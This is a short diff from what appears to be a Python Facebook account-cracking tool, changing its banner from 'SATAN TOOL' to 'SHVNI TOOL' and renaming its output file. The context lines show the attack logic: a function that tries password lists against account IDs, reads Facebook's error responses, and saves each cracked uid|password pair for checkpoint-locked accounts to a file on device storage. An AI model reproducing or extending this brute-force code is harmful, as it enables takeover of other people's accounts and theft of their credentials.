@@ -381,7 +381,7 @@ key = 'true'
 while key == 'true':
     username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SATAN TOOL SUCCESSFULLY') 
+            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SHVNI TOOL ENJOY') 
             time.sleep(1)
             clear()
             key = 'false'
@@ -877,7 +877,7 @@ def newidx(ids,names,passlist):
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
 				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
+				open('/sdcard/SHVI-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
